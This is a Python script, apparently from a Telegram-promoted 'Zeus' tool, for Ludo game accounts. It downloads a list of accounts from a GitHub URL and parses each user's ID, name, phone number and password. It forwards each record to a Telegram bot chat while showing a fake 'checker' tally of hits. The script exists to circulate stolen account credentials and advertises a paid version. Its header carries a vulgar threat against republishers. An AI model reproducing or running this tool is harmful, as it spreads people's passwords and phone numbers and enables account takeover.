#تم فك اداه بواسطه @Aa_6wa
#اذا غيرت حقوقه و نشرته انيج امك و انيج عرضك

import os
import sys
import time
import random
import threading
import urllib.request
import urllib.parse
import webbrowser

BOLD = '\x1b[1m'
RED = '\x1b[1;31m'
GREEN = '\x1b[1;32m'
YELLOW = '\x1b[1;33m'
BLUE = '\x1b[1;34m'
PINK = '\x1b[1;35m'
CYAN = '\x1b[1;36m'
WHITE = '\x1b[1;37m'
PURPLE = '\x1b[1;38;5;129m'
RESET = '\x1b[0m'


def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')


stats = {'total': 0, 'good': 0, 'wrong_pass': 0, 'not_registered': 0, 'error': 0}
levels_count = [0, 0, 0, 0, 0]
golds_count = [0, 0, 0, 0, 0, 0]
diamonds_count = [0, 0, 0, 0, 0, 0]
start_time = time.time()
stop_flag = False
bot_token = ''
chat_id = ''
accounts_file = 'accounts.txt'


# ==================== LOGO ====================#
logo = f"""
{RED}●─────━Zeus─────━●
{RED}╱╱╭━━━┳━┳━━━┳━╮
{RED}╭━┫╭━╮┃━┫╭━╮┃━┫
{RED}┃╋┣╯╭╯┣━┣╯╭╯┣━┃
{RED}┃╭╯╱┃╭┻━╯╱┃╭┻━╯
{RED}╰╯╱╱┃┃╱╱╱╱┃┃

{RED}  ×─> {RED}━━━━━━━{RED}━━━━━━━━━━{RED}━━━━━━━━━━━━{RED}━━━━━{RED}Zeus━━━━━━{RED}━━━━━ <─×{RESET}
"""


# ==================== MOVING LOGO ====================#
def animate_logo():
    frames = [
        "ㅂㅈ둎ㄴ묘ㅑㅏㅍㅌㄷㄴ퍼ㅑㅕㅐ멋넛냣아ㅛ아요ㅏㅛ",
        "아ㅛ잏틒ㅋㄹ닛뎌내ㅛㅑㅅ냣내ㅛㅇ",
        "ㄷ벼냣냣냣낳타핰효오로러처러ㅕ려려려러ㅓ퍼처러",
        "추하허ㅗ러러ㅓ처류",
        "ㅛㄱㅈㄴ포ㅑㅅㅈㅂ뎌ㅐㅐㅏㅠㅌㄴㅈ"
    ]
    for frame in frames:
        print(f"{RED}{frame}{RESET}")
        time.sleep(0.3)


def print_checker_stats():
    clear_screen()
    elapsed = int(time.time() - start_time)
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    print(f"""
{BOLD}{PURPLE}┌──────────────────────────────────┐{RESET}
{BOLD}{PURPLE}│{RESET}     {BOLD}{PURPLE}CHECKER STATS{RESET}             {BOLD}{PURPLE}│{RESET}
{BOLD}{PURPLE}├──────────────────────────────────┤{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{WHITE}Country{RESET}  : {BOLD}{YELLOW}Saudi Arabia{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{WHITE}Proxies{RESET}  : {BOLD}{RED}yes Proxies{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{WHITE}Time{RESET}     : {BOLD}{YELLOW}{hours:02d}:{minutes:02d}:{seconds:02d}{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{WHITE}Checked{RESET}  : {BOLD}{YELLOW}{stats['total']}{RESET}
{BOLD}{PURPLE}├──────────────────────────────────┤{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{GREEN}Hits{RESET}     : {BOLD}{GREEN}{stats['good']}{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{PINK}unknown{RESET}  : {BOLD}{PINK}{stats['error']}{RESET}
{BOLD}{PURPLE}├──────────────────────────────────┤{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{BLUE}LEVELS{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{BLUE}├─{RESET} {BOLD}{WHITE}0-9{RESET}       : {BOLD}{BLUE}{levels_count[0]}{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{BLUE}├─{RESET} {BOLD}{WHITE}10-19{RESET}     : {BOLD}{BLUE}{levels_count[1]}{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{BLUE}├─{RESET} {BOLD}{WHITE}20-29{RESET}     : {BOLD}{BLUE}{levels_count[2]}{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{BLUE}├─{RESET} {BOLD}{WHITE}30-39{RESET}     : {BOLD}{BLUE}{levels_count[3]}{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{BLUE}└─{RESET} {BOLD}{WHITE}40+{RESET}       : {BOLD}{BLUE}{levels_count[4]}{RESET}
{BOLD}{PURPLE}├──────────────────────────────────┤{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{YELLOW}GOLD{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{YELLOW}├─{RESET} {BOLD}{WHITE}0-10k{RESET}     : {BOLD}{YELLOW}{golds_count[0]}{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{YELLOW}├─{RESET} {BOLD}{WHITE}10k-50k{RESET}   : {BOLD}{YELLOW}{golds_count[1]}{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{YELLOW}├─{RESET} {BOLD}{WHITE}50k-100k{RESET}  : {BOLD}{YELLOW}{golds_count[2]}{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{YELLOW}├─{RESET} {BOLD}{WHITE}100k-500k{RESET} : {BOLD}{YELLOW}{golds_count[3]}{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{YELLOW}├─{RESET} {BOLD}{WHITE}500k-1M{RESET}   : {BOLD}{YELLOW}{golds_count[4]}{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{YELLOW}└─{RESET} {BOLD}{WHITE}1M+{RESET}       : {BOLD}{YELLOW}{golds_count[5]}{RESET}
{BOLD}{PURPLE}├──────────────────────────────────┤{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{PINK}DIAMOND{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{PINK}├─{RESET} {BOLD}{WHITE}0-10{RESET}      : {BOLD}{PINK}{diamonds_count[0]}{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{PINK}├─{RESET} {BOLD}{WHITE}10-50{RESET}     : {BOLD}{PINK}{diamonds_count[1]}{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{PINK}├─{RESET} {BOLD}{WHITE}50-100{RESET}    : {BOLD}{PINK}{diamonds_count[2]}{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{PINK}├─{RESET} {BOLD}{WHITE}100-500{RESET}   : {BOLD}{PINK}{diamonds_count[3]}{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{PINK}├─{RESET} {BOLD}{WHITE}500-1K{RESET}    : {BOLD}{PINK}{diamonds_count[4]}{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{PINK}└─{RESET} {BOLD}{WHITE}1K+{RESET}       : {BOLD}{PINK}{diamonds_count[5]}{RESET}
{BOLD}{PURPLE}├──────────────────────────────────┤{RESET}
{BOLD}{PURPLE}│{RESET}  {BOLD}{PINK}@R7_36 ~Zeus @R7Aih1{RESET}
{BOLD}{PURPLE}└──────────────────────────────────┘{RESET}
""")


# ==================== SEND TO TELEGRAM ====================#
def download_file(url, name):
    try:
        print(BOLD + YELLOW + '[+] Downloading accounts file...' + RESET)
        headers = {'User-Agent': 'Mozilla/5.0'}
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = resp.read()
        with open(name, 'wb') as f:
            f.write(data)
        print(BOLD + GREEN + '[+] File downloaded: ' + name + RESET)
        return True
    except Exception as e:
        print(BOLD + RED + '[!] Download failed: ' + str(e) + RESET)
        return False


def send_to_telegram(msg, bot_token, chat_id):
    try:
        url = 'https://api.telegram.org/bot' + bot_token + '/sendMessage'
        data = urllib.parse.urlencode({'chat_id': chat_id, 'text': msg}).encode()
        req = urllib.request.Request(url, data=data)
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status == 200
    except Exception:
        return False


def parse_accounts(content):
    accounts = []
    blocks = content.split('✦ PS Ludo HTS ✅ ✦')
    for block in blocks:
        acc = {}
        for line in block.splitlines():
            line = line.strip()
            if not line:
                continue
            if '❖ المعرف' in line:
                acc['id'] = line.partition('➜')[2].strip()
            elif '❖ الاسم' in line:
                acc['name'] = line.partition('➜')[2].strip()
            elif '❖ الجوال' in line:
                acc['phone'] = line.partition('➜')[2].strip()
            elif '❖ كلمة السر' in line:
                acc['password'] = line.partition('➜')[2].strip()
            elif '❖ VIP' in line:
                acc['vip'] = line.partition('➜')[2].strip()
            elif '❖ الذهب' in line:
                acc['gold'] = line.partition('➜')[2].replace('💛', '').strip()
            elif '❖ الألماس' in line:
                acc['diamond'] = line.partition('➜')[2].replace('💎', '').strip()
            elif '❖ المستوى' in line:
                acc['level'] = line.partition('➜')[2].replace('⚡', '').strip()
        if acc:
            accounts.append(acc)
    return accounts


def build_message(acc):
    return (
        '✦ Zeus Ludo HTS  ✦\n'
        '★━━━━━━━━━━━━━━━━━━★\n'
        '\n'
        '  ✧  ID       ➜ ' + acc.get('id', 'N/A') + '\n'
        '  ✧  Name     ➜ ' + acc.get('name', 'N/A') + '\n'
        '  ✧  Phone    ➜ ' + acc.get('phone', 'N/A') + '\n'
        '  ✧  Password ➜ ' + acc.get('password', 'N/A') + '\n'
        '\n'
        '  ✧  VIP      ➜ ' + acc.get('vip', 'N/A') + '\n'
        '  ✧  Gold     ➜ ' + acc.get('gold', 'N/A') + '\n'
        '  ✧  Diamond  ➜ ' + acc.get('diamond', 'N/A') + '\n'
        '  ✧  Level    ➜ ' + acc.get('level', 'N/A') + '\n'
        '\n'
        '━━━━━━━━━━━━━━━━\n'
        '  ✧  Channel ➜ @R7Aih1\n'
        '  ✧  Dev      ➜ @R7_36\n'
        'هاي نسخه تجربه اذا تحب تشترك بنسخه المدفوعه هاي مميزاته https://t.me/R7Aih1/10640\n'
        '━━━━━━━━━━━━━━━━\n'
    )


def update_stats(acc):
    stats['total'] += 1
    stats['good'] += 1
    try:
        lvl = int(acc.get('level', '0').strip())
        if lvl < 10:
            levels_count[0] += 1
        elif lvl < 20:
            levels_count[1] += 1
        elif lvl < 30:
            levels_count[2] += 1
        elif lvl < 40:
            levels_count[3] += 1
        else:
            levels_count[4] += 1
    except (ValueError, TypeError):
        pass
    try:
        gold = int(acc.get('gold', '0').strip())
        if gold < 10000:
            golds_count[0] += 1
        elif gold < 50000:
            golds_count[1] += 1
        elif gold < 100000:
            golds_count[2] += 1
        elif gold < 500000:
            golds_count[3] += 1
        elif gold < 1000000:
            golds_count[4] += 1
        else:
            golds_count[5] += 1
    except (ValueError, TypeError):
        pass
    try:
        diamond = int(acc.get('diamond', '0').strip())
        if diamond < 10:
            diamonds_count[0] += 1
        elif diamond < 50:
            diamonds_count[1] += 1
        elif diamond < 100:
            diamonds_count[2] += 1
        elif diamond < 500:
            diamonds_count[3] += 1
        elif diamond < 1000:
            diamonds_count[4] += 1
        else:
            diamonds_count[5] += 1
    except (ValueError, TypeError):
        pass


def update_display():
    while not stop_flag:
        print_checker_stats()
        time.sleep(2)


# ==================== MAIN ====================#
if __name__ == '__main__':
    clear_screen()

    # عرض اللوكو + المتحرك
    print(logo)
    print()
    animate_logo()
    print()

    # فتح رابط القناة
    webbrowser.open('https://t.me/R7Aih1')

    # طلب التوكن والـ ID بلون وردي فقط
    bot_token = input(f"{PINK}TOKEN >>> {RESET}").strip()
    chat_id   = input(f"{PINK}ID    >>> {RESET}").strip()

    # تنزيل ملف الحسابات
    url = 'https://github.com/lm9011109t-pixel/LLLLL/raw/refs/heads/main/%D8%AD%D8%B3%D8%A7%D8%A8%D8%A7%D8%AA%20.txt'
    if not download_file(url, accounts_file):
        sys.exit()

    with open(accounts_file, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    accounts = parse_accounts(content)
    random.shuffle(accounts)

    display_thread = threading.Thread(target=update_display, daemon=True)
    display_thread.start()

    sent = 0
    for acc in accounts:
        if stop_flag:
            break

        msg_plain = build_message(acc)
        ok = send_to_telegram(msg_plain, bot_token, chat_id)

        if ok:
            sent += 1
            update_stats(acc)
        else:
            stats['total'] += 1
            stats['error'] += 1

        time.sleep(2)

    stop_flag = True
    time.sleep(2)
    print_checker_stats()
    print(BOLD + GREEN + '\n[+] Done! Sent ' + str(sent) + '/' + str(len(accounts)) + ' accounts' + RESET)